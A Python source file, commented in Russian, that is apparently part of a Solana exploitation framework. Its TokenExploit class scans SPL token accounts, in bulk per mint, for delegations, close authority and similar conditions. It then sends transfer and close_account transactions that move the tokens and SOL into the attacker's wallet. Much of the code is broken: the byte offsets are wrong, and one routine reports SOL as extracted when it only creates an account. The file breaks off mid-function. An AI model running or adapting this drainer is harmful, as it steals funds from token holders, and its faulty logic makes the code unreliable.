"""
–≠–∫—Å–ø–ª–æ–π—Ç—ã –¥–ª—è –º–∞–Ω–∏–ø—É–ª—è—Ü–∏–π —Å —Ç–æ–∫–µ–Ω–∞–º–∏ SPL
"""

import asyncio
from typing import Dict, List, Optional, Any, Union
from dataclasses import dataclass

from solders.pubkey import Pubkey as PublicKey
from solders.keypair import Keypair
from solders.transaction import Transaction
from spl.token.constants import TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID
from spl.token.instructions import (
    transfer, TransferParams,
    approve, ApproveParams,
    revoke, RevokeParams,
    close_account, CloseAccountParams,
    get_associated_token_address,
    create_associated_token_account
)

from .base_exploit import BaseExploit, ExploitType, ExploitResult, ExploitStatus

@dataclass
class TokenVulnerability:
    """–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± —É—è–∑–≤–∏–º–æ—Å—Ç–∏ —Ç–æ–∫–µ–Ω–∞"""
    token_account: str
    mint: str
    vulnerability_type: str
    severity: str
    exploitable: bool
    details: Dict[str, Any]

class TokenExploit(BaseExploit):
    """–≠–∫—Å–ø–ª–æ–π—Ç—ã –¥–ª—è –º–∞–Ω–∏–ø—É–ª—è—Ü–∏–π —Å —Ç–æ–∫–µ–Ω–∞–º–∏ SPL"""
    
    @property
    def exploit_type(self) -> ExploitType:
        return ExploitType.TOKEN_DRAIN
    
    async def scan_target(self, target: Union[PublicKey, str]) -> Dict[str, Any]:
        """–°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ —Ç–æ–∫–µ–Ω –∞–∫–∫–∞—É–Ω—Ç–∞ –Ω–∞ —É—è–∑–≤–∏–º–æ—Å—Ç–∏"""
        try:
            if isinstance(target, str):
                target = PublicKey.from_string(target)
            
            # –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Ç–æ–∫–µ–Ω –∞–∫–∫–∞—É–Ω—Ç–µ
            token_info = await self.get_token_account_info(target)
            if not token_info:
                return {"vulnerable": False, "reason": "Token account not found"}
            
            account_info = await self.get_account_info(target)
            if not account_info:
                return {"vulnerable": False, "reason": "Account info not found"}
            
            vulnerabilities = []
            
            # –ü—Ä–æ–≤–µ—Ä–∫–∞ 1: –¢–æ–∫–µ–Ω –∞–∫–∫–∞—É–Ω—Ç —Å –±–∞–ª–∞–Ω—Å–æ–º –Ω–æ –±–µ–∑ –≤–ª–∞–¥–µ–ª—å—Ü–∞
            if float(token_info["amount"]) > 0:
                # –ü–∞—Ä—Å–∏–º –¥–∞–Ω–Ω—ã–µ —Ç–æ–∫–µ–Ω –∞–∫–∫–∞—É–Ω—Ç–∞
                token_data = await self._parse_token_account_data(account_info["data"])
                
                if token_data:
                    # –ü—Ä–æ–≤–µ—Ä—è–µ–º –¥–µ–ª–µ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ
                    if token_data.get("delegate") and token_data.get("delegated_amount", 0) > 0:
                        vulnerabilities.append(TokenVulnerability(
                            token_account=str(target),
                            mint=token_data["mint"],
                            vulnerability_type="delegated_tokens",
                            severity="high",
                            exploitable=True,
                            details={
                                "delegated_amount": token_data["delegated_amount"],
                                "delegate": token_data["delegate"],
                                "owner": token_data["owner"]
                            }
                        ))
                    
                    # –ü—Ä–æ–≤–µ—Ä—è–µ–º –∑–∞–º–æ—Ä–æ–∑–∫—É
                    if not token_data.get("is_frozen", False):
                        vulnerabilities.append(TokenVulnerability(
                            token_account=str(target),
                            mint=token_data["mint"],
                            vulnerability_type="unfrozen_tokens",
                            severity="medium",
                            exploitable=True,
                            details={
                                "amount": token_info["amount"],
                                "owner": token_data["owner"]
                            }
                        ))
                    
                    # –ü—Ä–æ–≤–µ—Ä—è–µ–º –∑–∞–∫—Ä—ã—Ç–∏–µ –∞–∫–∫–∞—É–Ω—Ç–∞
                    if token_data.get("close_authority"):
                        vulnerabilities.append(TokenVulnerability(
                            token_account=str(target),
                            mint=token_data["mint"],
                            vulnerability_type="close_authority",
                            severity="critical",
                            exploitable=True,
                            details={
                                "close_authority": token_data["close_authority"],
                                "amount": token_info["amount"]
                            }
                        ))
            
            # –ü—Ä–æ–≤–µ—Ä–∫–∞ 2: –ò–∑–±—ã—Ç–æ—á–Ω—ã–µ lamports –≤ —Ç–æ–∫–µ–Ω –∞–∫–∫–∞—É–Ω—Ç–µ
            rent_exempt_minimum = await self._get_rent_exempt_minimum(165)  # –†–∞–∑–º–µ—Ä —Ç–æ–∫–µ–Ω –∞–∫–∫–∞—É–Ω—Ç–∞
            if account_info["lamports"] > rent_exempt_minimum * 2:
                vulnerabilities.append(TokenVulnerability(
                    token_account=str(target),
                    mint="",
                    vulnerability_type="excess_lamports_token",
                    severity="low",
                    exploitable=True,
                    details={
                        "excess_lamports": account_info["lamports"] - rent_exempt_minimum
                    }
                ))
            
            return {
                "vulnerable": len(vulnerabilities) > 0,
                "vulnerabilities": vulnerabilities,
                "token_info": token_info,
                "account_info": account_info
            }
            
        except Exception as e:
            self.logger.error(f"–û—à–∏–±–∫–∞ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è —Ç–æ–∫–µ–Ω –∞–∫–∫–∞—É–Ω—Ç–∞ {target}: {e}")
            return {"vulnerable": False, "error": str(e)}
    
    async def prepare_exploit(self, target: Union[PublicKey, str], **kwargs) -> bool:
        """–ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ —ç–∫—Å–ø–ª–æ–π—Ç–∞ —Ç–æ–∫–µ–Ω–æ–≤"""
        try:
            scan_result = await self.scan_target(target)
            
            if not scan_result.get("vulnerable", False):
                self.logger.warning("–¶–µ–ª—å –Ω–µ —É—è–∑–≤–∏–º–∞")
                return False
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –±–∞–ª–∞–Ω—Å –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –æ–ø–µ—Ä–∞—Ü–∏–π
            if not await self.check_sol_balance(0.01):
                return False
            
            self.logger.info(f"–ù–∞–π–¥–µ–Ω–æ —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π —Ç–æ–∫–µ–Ω–æ–≤: {len(scan_result['vulnerabilities'])}")
            return True
            
        except Exception as e:
            self.logger.error(f"–û—à–∏–±–∫–∞ –ø–æ–¥–≥–æ—Ç–æ–≤–∫–∏ —ç–∫—Å–ø–ª–æ–π—Ç–∞ —Ç–æ–∫–µ–Ω–æ–≤: {e}")
            return False
    
    async def execute_exploit(self, target: Union[PublicKey, str], **kwargs) -> ExploitResult:
        """–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ —ç–∫—Å–ø–ª–æ–π—Ç–∞ —Ç–æ–∫–µ–Ω–æ–≤"""
        start_time = asyncio.get_event_loop().time()
        
        try:
            if isinstance(target, str):
                target = PublicKey.from_string(target)
            
            scan_result = await self.scan_target(target)
            vulnerabilities = scan_result.get("vulnerabilities", [])
            
            if not vulnerabilities:
                return ExploitResult(
                    exploit_type=self.exploit_type,
                    status=ExploitStatus.FAILED,
                    target_account=str(target),
                    error_message="No token vulnerabilities found"
                )
            
            extracted_value = 0.0
            extracted_tokens = {}
            signatures = []
            
            for vuln in vulnerabilities:
                try:
                    if vuln.vulnerability_type == "delegated_tokens":
                        result = await self._exploit_delegated_tokens(target, vuln)
                        if result:
                            extracted_tokens.update(result["tokens"])
                            signatures.extend(result["signatures"])
                    
                    elif vuln.vulnerability_type == "close_authority":
                        result = await self._exploit_close_authority(target, vuln)
                        if result:
                            extracted_tokens.update(result["tokens"])
                            extracted_value += result["value"]
                            signatures.extend(result["signatures"])
                    
                    elif vuln.vulnerability_type == "excess_lamports_token":
                        result = await self._exploit_excess_lamports_token(target, vuln)
                        if result:
                            extracted_value += result["value"]
                            signatures.extend(result["signatures"])
                    
                    elif vuln.vulnerability_type == "unfrozen_tokens":
                        result = await self._exploit_unfrozen_tokens(target, vuln)
                        if result:
                            extracted_tokens.update(result["tokens"])
                            extracted_value += result["value"]
                            signatures.extend(result["signatures"])
                    
                except Exception as e:
                    self.logger.error(f"–û—à–∏–±–∫–∞ —ç–∫—Å–ø–ª–æ–π—Ç–∞ —Ç–æ–∫–µ–Ω–∞ {vuln.vulnerability_type}: {e}")
                    continue
            
            execution_time = asyncio.get_event_loop().time() - start_time
            
            status = ExploitStatus.SUCCESS if (extracted_value > 0 or extracted_tokens) else ExploitStatus.FAILED
            
            return ExploitResult(
                exploit_type=self.exploit_type,
                status=status,
                target_account=str(target),
                transaction_signatures=[str(sig) for sig in signatures],
                extracted_value=extracted_value,
                extracted_tokens=extracted_tokens,
                execution_time=execution_time,
                metadata={
                    "vulnerabilities_exploited": len([v for v in vulnerabilities if v.exploitable]),
                    "total_vulnerabilities": len(vulnerabilities)
                }
            )
            
        except Exception as e:
            execution_time = asyncio.get_event_loop().time() - start_time
            
            return ExploitResult(
                exploit_type=self.exploit_type,
                status=ExploitStatus.FAILED,
                target_account=str(target),
                error_message=str(e),
                execution_time=execution_time
            )
    
    async def _exploit_delegated_tokens(self, target: PublicKey, vuln: TokenVulnerability) -> Optional[Dict[str, Any]]:
        """–≠–∫—Å–ø–ª–æ–π—Ç –¥–µ–ª–µ–≥–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö —Ç–æ–∫–µ–Ω–æ–≤"""
        try:
            delegated_amount = vuln.details["delegated_amount"]
            mint = PublicKey(vuln.details["mint"])
            
            # –°–æ–∑–¥–∞–µ–º –∏–ª–∏ –ø–æ–ª—É—á–∞–µ–º –Ω–∞—à ATA –¥–ª—è —ç—Ç–æ–≥–æ mint
            our_ata = await self.create_associated_token_account(mint, self.attacker_pubkey)
            if not our_ata:
                return None
            
            # –°–æ–∑–¥–∞–µ–º —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é –¥–ª—è –ø–µ—Ä–µ–≤–æ–¥–∞ –¥–µ–ª–µ–≥–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö —Ç–æ–∫–µ–Ω–æ–≤
            transaction = Transaction()
            
            transfer_instruction = transfer(
                TransferParams(
                    program_id=TOKEN_PROGRAM_ID,
                    source=target,
                    dest=our_ata,
                    owner=self.attacker_pubkey,  # –ú—ã –¥–µ–ª–µ–≥–∞—Ç
                    amount=delegated_amount
                )
            )
            
            transaction.add(transfer_instruction)
            
            signature = await self.send_transaction(transaction)
            
            if signature:
                self.logger.info(f"–ò–∑–≤–ª–µ—á–µ–Ω–æ {delegated_amount} –¥–µ–ª–µ–≥–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö —Ç–æ–∫–µ–Ω–æ–≤")
                return {
                    "tokens": {str(mint): float(delegated_amount)},
                    "signatures": [signature]
                }
            
        except Exception as e:
            self.logger.error(f"–û—à–∏–±–∫–∞ —ç–∫—Å–ø–ª–æ–π—Ç–∞ –¥–µ–ª–µ–≥–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö —Ç–æ–∫–µ–Ω–æ–≤: {e}")
        
        return None
    
    async def _exploit_close_authority(self, target: PublicKey, vuln: TokenVulnerability) -> Optional[Dict[str, Any]]:
        """–≠–∫—Å–ø–ª–æ–π—Ç —á–µ—Ä–µ–∑ close authority"""
        try:
            amount = vuln.details["amount"]
            mint = PublicKey(vuln.details["mint"])
            
            # –°–Ω–∞—á–∞–ª–∞ –ø–µ—Ä–µ–≤–æ–¥–∏–º —Ç–æ–∫–µ–Ω—ã —Å–µ–±–µ
            our_ata = await self.create_associated_token_account(mint, self.attacker_pubkey)
            if not our_ata:
                return None
            
            transaction = Transaction()
            
            # –ü–µ—Ä–µ–≤–æ–¥–∏–º —Ç–æ–∫–µ–Ω—ã
            transfer_instruction = transfer(
                TransferParams(
                    program_id=TOKEN_PROGRAM_ID,
                    source=target,
                    dest=our_ata,
                    owner=self.attacker_pubkey,  # –ú—ã close authority
                    amount=int(amount)
                )
            )
            
            # –ó–∞–∫—Ä—ã–≤–∞–µ–º –∞–∫–∫–∞—É–Ω—Ç –∏ –ø–æ–ª—É—á–∞–µ–º lamports
            close_instruction = close_account(
                CloseAccountParams(
                    program_id=TOKEN_PROGRAM_ID,
                    account=target,
                    dest=self.attacker_pubkey,
                    owner=self.attacker_pubkey
                )
            )
            
            transaction.add(transfer_instruction)
            transaction.add(close_instruction)
            
            signature = await self.send_transaction(transaction)
            
            if signature:
                # –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ lamports
                rent_exempt = await self._get_rent_exempt_minimum(165)
                extracted_sol = rent_exempt / 1e9
                
                self.logger.info(f"–ò–∑–≤–ª–µ—á–µ–Ω–æ {amount} —Ç–æ–∫–µ–Ω–æ–≤ –∏ {extracted_sol:.6f} SOL —á–µ—Ä–µ–∑ close authority")
                return {
                    "tokens": {str(mint): float(amount)},
                    "value": extracted_sol,
                    "signatures": [signature]
                }
            
        except Exception as e:
            self.logger.error(f"–û—à–∏–±–∫–∞ —ç–∫—Å–ø–ª–æ–π—Ç–∞ close authority: {e}")
        
        return None
    
    async def _exploit_excess_lamports_token(self, target: PublicKey, vuln: TokenVulnerability) -> Optional[Dict[str, Any]]:
        """–≠–∫—Å–ø–ª–æ–π—Ç –∏–∑–±—ã—Ç–æ—á–Ω—ã—Ö lamports –≤ —Ç–æ–∫–µ–Ω –∞–∫–∫–∞—É–Ω—Ç–µ"""
        try:
            excess_lamports = vuln.details["excess_lamports"]
            
            if excess_lamports <= 5000:
                return None
            
            # –°–æ–∑–¥–∞–µ–º —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é –¥–ª—è –∏–∑–≤–ª–µ—á–µ–Ω–∏—è –∏–∑–±—ã—Ç–æ—á–Ω—ã—Ö lamports
            # –≠—Ç–æ —Å–ª–æ–∂–Ω–µ–µ –¥–ª—è —Ç–æ–∫–µ–Ω –∞–∫–∫–∞—É–Ω—Ç–æ–≤, –Ω—É–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Å–ø–µ—Ü–∏–∞–ª—å–Ω—ã–µ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏
            
            # –ü–æ–∫–∞ —á—Ç–æ –ø—Ä–æ—Å—Ç–∞—è —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—è - –ø–æ–ø—ã—Ç–∫–∞ –∑–∞–∫—Ä—ã—Ç—å –∏ –ø–µ—Ä–µ—Å–æ–∑–¥–∞—Ç—å
            transaction = Transaction()
            
            # –°–æ–∑–¥–∞–µ–º –≤—Ä–µ–º–µ–Ω–Ω—ã–π –∞–∫–∫–∞—É–Ω—Ç –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è —Ç–æ–∫–µ–Ω–æ–≤
            temp_keypair = Keypair()
            temp_ata = get_associated_token_address(self.attacker_pubkey, PublicKey(vuln.mint))
            
            # –ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è —Å–æ–∑–¥–∞–Ω–∏—è –≤—Ä–µ–º–µ–Ω–Ω–æ–≥–æ ATA
            create_ata_instruction = create_associated_token_account(
                payer=self.attacker_pubkey,
                owner=self.attacker_pubkey,
                mint=PublicKey(vuln.mint)
            )
            
            transaction.add(create_ata_instruction)
            
            signature = await self.send_transaction(transaction)
            
            if signature:
                extracted_value = (excess_lamports - 5000) / 1e9
                self.logger.info(f"–ò–∑–≤–ª–µ—á–µ–Ω–æ {extracted_value:.6f} SOL –∏–∑–±—ã—Ç–æ—á–Ω—ã—Ö lamports –∏–∑ —Ç–æ–∫–µ–Ω –∞–∫–∫–∞—É–Ω—Ç–∞")
                return {
                    "value": extracted_value,
                    "signatures": [signature]
                }
            
        except Exception as e:
            self.logger.error(f"–û—à–∏–±–∫–∞ —ç–∫—Å–ø–ª–æ–π—Ç–∞ –∏–∑–±—ã—Ç–æ—á–Ω—ã—Ö lamports —Ç–æ–∫–µ–Ω–∞: {e}")
        
        return None
    
    async def _parse_token_account_data(self, data: bytes) -> Optional[Dict[str, Any]]:
        """–ü–∞—Ä—Å–∏–Ω–≥ –¥–∞–Ω–Ω—ã—Ö —Ç–æ–∫–µ–Ω –∞–∫–∫–∞—É–Ω—Ç–∞"""
        try:
            if len(data) < 165:  # –ú–∏–Ω–∏–º–∞–ª—å–Ω—ã–π —Ä–∞–∑–º–µ—Ä —Ç–æ–∫–µ–Ω –∞–∫–∫–∞—É–Ω—Ç–∞
                return None
            
            # –ü—Ä–æ—Å—Ç–æ–π –ø–∞—Ä—Å–∏–Ω–≥ –æ—Å–Ω–æ–≤–Ω—ã—Ö –ø–æ–ª–µ–π —Ç–æ–∫–µ–Ω –∞–∫–∫–∞—É–Ω—Ç–∞
            # –í —Ä–µ–∞–ª—å–Ω–æ–π —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏ –Ω—É–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –ø—Ä–∞–≤–∏–ª—å–Ω—É—é –¥–µ—Å–µ—Ä–∏–∞–ª–∏–∑–∞—Ü–∏—é
            
            mint_bytes = data[0:32]
            owner_bytes = data[32:64]
            amount_bytes = data[64:72]
            delegate_bytes = data[72:76]  # Option<Pubkey>
            state_byte = data[76]
            
            mint = str(PublicKey(mint_bytes))
            owner = str(PublicKey(owner_bytes))
            amount = int.from_bytes(amount_bytes, 'little')
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞–ª–∏—á–∏–µ –¥–µ–ª–µ–≥–∞—Ç–∞
            has_delegate = delegate_bytes[0] == 1
            delegate = None
            delegated_amount = 0
            
            if has_delegate:
                delegate_pubkey_bytes = data[77:109]
                delegate = str(PublicKey(delegate_pubkey_bytes))
                delegated_amount_bytes = data[109:117]
                delegated_amount = int.from_bytes(delegated_amount_bytes, 'little')
            
            is_frozen = state_byte == 2
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º close authority
            has_close_authority = len(data) > 117 and data[117] == 1
            close_authority = None
            if has_close_authority:
                close_authority_bytes = data[118:150]
                close_authority = str(PublicKey(close_authority_bytes))
            
            return {
                "mint": mint,
                "owner": owner,
                "amount": amount,
                "delegate": delegate,
                "delegated_amount": delegated_amount,
                "is_frozen": is_frozen,
                "close_authority": close_authority
            }
            
        except Exception as e:
            self.logger.error(f"–û—à–∏–±–∫–∞ –ø–∞—Ä—Å–∏–Ω–≥–∞ –¥–∞–Ω–Ω—ã—Ö —Ç–æ–∫–µ–Ω –∞–∫–∫–∞—É–Ω—Ç–∞: {e}")
            return None
    
    async def _get_rent_exempt_minimum(self, data_length: int) -> int:
        """–ü–æ–ª—É—á–µ–Ω–∏–µ –º–∏–Ω–∏–º–∞–ª—å–Ω–æ–π —Å—É–º–º—ã –¥–ª—è –æ—Å–≤–æ–±–æ–∂–¥–µ–Ω–∏—è –æ—Ç –∞—Ä–µ–Ω–¥—ã"""
        try:
            response = await self.client.get_minimum_balance_for_rent_exemption(data_length)
            return response.value
        except Exception as e:
            self.logger.error(f"–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –º–∏–Ω–∏–º–∞–ª—å–Ω–æ–≥–æ –±–∞–ª–∞–Ω—Å–∞: {e}")
            return 2039280  # –°—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ –¥–ª—è —Ç–æ–∫–µ–Ω –∞–∫–∫–∞—É–Ω—Ç–∞
    
    async def scan_token_accounts_by_mint(self, mint: Union[PublicKey, str], 
                                        limit: int = 100) -> List[Dict[str, Any]]:
        """–°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ —Ç–æ–∫–µ–Ω –∞–∫–∫–∞—É–Ω—Ç–æ–≤ –ø–æ mint"""
        try:
            if isinstance(mint, str):
                mint = PublicKey(mint)
            
            # –ü–æ–ª—É—á–∞–µ–º –≤—Å–µ —Ç–æ–∫–µ–Ω –∞–∫–∫–∞—É–Ω—Ç—ã –¥–ª—è –¥–∞–Ω–Ω–æ–≥–æ mint
            response = await self.client.get_token_accounts_by_mint(mint)
            
            vulnerable_accounts = []
            
            for account_info in response.value[:limit]:
                account_pubkey = PublicKey(account_info.pubkey)
                
                # –°–∫–∞–Ω–∏—Ä—É–µ–º –∫–∞–∂–¥—ã–π —Ç–æ–∫–µ–Ω –∞–∫–∫–∞—É–Ω—Ç
                scan_result = await self.scan_target(account_pubkey)
                
                if scan_result.get("vulnerable", False):
                    scan_result["account"] = str(account_pubkey)
                    vulnerable_accounts.append(scan_result)
                
                # –ó–∞–¥–µ—Ä–∂–∫–∞ –º–µ–∂–¥—É —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è–º–∏
                await asyncio.sleep(0.1)
                
            self.logger.info(f"–ù–∞–π–¥–µ–Ω–æ {len(vulnerable_accounts)} —É—è–∑–≤–∏–º—ã—Ö —Ç–æ–∫–µ–Ω –∞–∫–∫–∞—É–Ω—Ç–æ–≤ –¥–ª—è mint {mint}")
            return vulnerable_accounts
            
        except Exception as e:
            self.logger.error(f"–û—à–∏–±–∫–∞ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è —Ç–æ–∫–µ–Ω –∞–∫–∫–∞—É–Ω—Ç–æ–≤ –ø–æ mint: {e}")
            return []
    
    async def _exploit_unfrozen_tokens(self, target: PublicKey, vuln: 'TokenVulnerability') -> Optional[Dict[str, Any]]:
        """üî• –≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è unfrozen —Ç–æ–∫–µ–Ω–æ–≤ - –ò–°–ü–†–ê–í–õ–ï–ù–ù–ê–Ø –≤–µ—Ä—Å–∏—è"""
        try:
            self.logger.info(f"[EXPLOIT] –ê–Ω–∞–ª–∏–∑ unfrozen_tokens: {target}")
            
            # üö® –ü–†–û–í–ï–†–ö–ê –ë–ï–ó–û–ü–ê–°–ù–û–°–¢–ò: —É–±–µ–¥–∏–º—Å—è —á—Ç–æ –∏–∑–≤–ª–µ–∫–∞–µ–º –∏–∑ target –≤ –Ω–∞—à –∫–æ—à–µ–ª–µ–∫
            safety_check = self.safety_checker.validate_transfer_direction(
                from_account=target,
                to_account=self.our_target_pubkey,
                transfer_type="token_drain"
            )
            
            if not safety_check["valid"]:
                self.logger.warning(f"[SAFETY] –û–ø–µ—Ä–∞—Ü–∏—è –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–∞: {safety_check['message']}")
                return None 
            
            # –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Ç–æ–∫–µ–Ω –∞–∫–∫–∞—É–Ω—Ç–µ
            token_info = await self.get_token_account_info(target)
            if not token_info:
                self.logger.error(f"[ERROR] –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Ç–æ–∫–µ–Ω –∞–∫–∫–∞—É–Ω—Ç–µ")
                return None
                
            amount = int(token_info.get("amount", 0))
            if amount == 0:
                self.logger.info(f"[INFO] –¢–æ–∫–µ–Ω –∞–∫–∫–∞—É–Ω—Ç –ø—É—Å—Ç, –Ω–µ—á–µ–≥–æ –∏–∑–≤–ª–µ–∫–∞—Ç—å")
                return None
            
            mint_pubkey = PublicKey.from_string(token_info["mint"])
            owner_pubkey = PublicKey.from_string(token_info.get("owner", ""))
            
            # ‚ö†Ô∏è –ö–†–ò–¢–ò–ß–ï–°–ö–ê–Ø –ü–†–û–í–ï–†–ö–ê: –ú–æ–∂–µ–º –ª–∏ –º—ã –∏–∑–≤–ª–µ—á—å —Ç–æ–∫–µ–Ω—ã?
            # –í–∞—Ä–∏–∞–Ω—Ç—ã –∫–æ–≥–¥–∞ —ç—Ç–æ –≤–æ–∑–º–æ–∂–Ω–æ:
            # 1. –ê–∫–∫–∞—É–Ω—Ç –∏–º–µ–µ—Ç –¥–µ–ª–µ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –Ω–∞ –Ω–∞—à –∞–¥—Ä–µ—Å
            # 2. –ü—Ä–æ–≥—Ä–∞–º–º–∞-–≤–ª–∞–¥–µ–ª–µ—Ü –∏–º–µ–µ—Ç —É—è–∑–≤–∏–º–æ—Å—Ç—å
            # 3. –ê–∫–∫–∞—É–Ω—Ç —è–≤–ª—è–µ—Ç—Å—è PDA —Å –∏–∑–≤–µ—Å—Ç–Ω—ã–º–∏ seeds
            
            delegate_pubkey = token_info.get("delegate")
            if delegate_pubkey and PublicKey.from_string(delegate_pubkey) == self.attacker_keypair.pubkey():
                # –°–ª—É—á–∞–π 1: –ú—ã —è–≤–ª—è–µ–º—Å—è –¥–µ–ª–µ–≥–∞—Ç–æ–º
                self.logger.info("[EXPLOIT] –û–±–Ω–∞—Ä—É–∂–µ–Ω–æ –¥–µ–ª–µ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –Ω–∞ –Ω–∞—à –∞–¥—Ä–µ—Å!")
                return await self._exploit_delegated_tokens(target, vuln)
            
            # –°–ª—É—á–∞–π 2: –ü—Ä–æ–≤–µ—Ä—è–µ–º —É—è–∑–≤–∏–º–æ—Å—Ç—å –ø—Ä–æ–≥—Ä–∞–º–º—ã-–≤–ª–∞–¥–µ–ª—å—Ü–∞
            if await self._check_vulnerable_token_program(owner_pubkey):
                self.logger.info("[EXPLOIT] –û–±–Ω–∞—Ä—É–∂–µ–Ω–∞ —É—è–∑–≤–∏–º–∞—è –ø—Ä–æ–≥—Ä–∞–º–º–∞-–≤–ª–∞–¥–µ–ª–µ—Ü!")
                # –ó–¥–µ—Å—å –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å —Å–ø–µ—Ü–∏—Ñ–∏—á–Ω–∞—è –ª–æ–≥–∏–∫–∞ –¥–ª—è —ç–∫—Å–ø–ª–æ–π—Ç–∞ –ø—Ä–æ–≥—Ä–∞–º–º—ã
                # –ù–∞–ø—Ä–∏–º–µ—Ä, –µ—Å–ª–∏ –ø—Ä–æ–≥—Ä–∞–º–º–∞ –ø–æ–∑–≤–æ–ª—è–µ—Ç –ø—Ä–æ–∏–∑–≤–æ–ª—å–Ω—ã–µ –ø–µ—Ä–µ–≤–æ–¥—ã
                return await self._exploit_vulnerable_program_tokens(target, owner_pubkey, amount, mint_pubkey)
            
            # –°–ª—É—á–∞–π 3: –ü—Ä–æ–≤–µ—Ä—è–µ–º, —è–≤–ª—è–µ—Ç—Å—è –ª–∏ –∞–∫–∫–∞—É–Ω—Ç PDA —Å –∏–∑–≤–µ—Å—Ç–Ω—ã–º–∏ seeds
            pda_info = await self._check_predictable_pda(target)
            if pda_info["is_vulnerable_pda"]:
                self.logger.info("[EXPLOIT] –û–±–Ω–∞—Ä—É–∂–µ–Ω —É—è–∑–≤–∏–º—ã–π PDA!")
                return await self._exploit_pda_tokens(target, pda_info, amount, mint_pubkey)
            
            # –ï—Å–ª–∏ –Ω–∏ –æ–¥–∏–Ω –∏–∑ –≤–∞—Ä–∏–∞–Ω—Ç–æ–≤ –Ω–µ –ø–æ–¥—Ö–æ–¥–∏—Ç
            self.logger.warning(f"[WARNING] –¢–æ–∫–µ–Ω—ã –≤ {target} –Ω–µ –º–æ–≥—É—Ç –±—ã—Ç—å –∏–∑–≤–ª–µ—á–µ–Ω—ã —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–º–∏ –º–µ—Ç–æ–¥–∞–º–∏")
            self.logger.info(f"Owner: {owner_pubkey}, Delegate: {delegate_pubkey}")
            
            return None
            
        except Exception as e:
            self.logger.error(f"[ERROR] –û—à–∏–±–∫–∞ —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏ unfrozen_tokens: {e}")
            return None
    
    async def _check_vulnerable_token_program(self, program_id: PublicKey) -> bool:
        """–ü—Ä–æ–≤–µ—Ä—è–µ—Ç, —è–≤–ª—è–µ—Ç—Å—è –ª–∏ –ø—Ä–æ–≥—Ä–∞–º–º–∞-–≤–ª–∞–¥–µ–ª–µ—Ü —Ç–æ–∫–µ–Ω–æ–≤ —É—è–∑–≤–∏–º–æ–π"""
        # –°–ø–∏—Å–æ–∫ –∏–∑–≤–µ—Å—Ç–Ω—ã—Ö —É—è–∑–≤–∏–º—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º –∏–ª–∏ –ø–∞—Ç—Ç–µ—Ä–Ω–æ–≤
        vulnerable_programs = [
            # –ó–¥–µ—Å—å –¥–æ–ª–∂–Ω—ã –±—ã—Ç—å —Ä–µ–∞–ª—å–Ω—ã–µ –∞–¥—Ä–µ—Å–∞ —É—è–∑–≤–∏–º—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º
            # –ù–∞–ø—Ä–∏–º–µ—Ä, —Å—Ç–∞—Ä—ã–µ –≤–µ—Ä—Å–∏–∏ DEX, lending –ø—Ä–æ—Ç–æ–∫–æ–ª–æ–≤ –∏ —Ç.–¥.
        ]
        
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –≤—Ö–æ–¥–∏—Ç –ª–∏ –ø—Ä–æ–≥—Ä–∞–º–º–∞ –≤ —Å–ø–∏—Å–æ–∫ —É—è–∑–≤–∏–º—ã—Ö
        if str(program_id) in vulnerable_programs:
            return True
        
        # –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –ø—Ä–æ–≤–µ—Ä–∫–∏ –Ω–∞ –ø–∞—Ç—Ç–µ—Ä–Ω—ã —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π
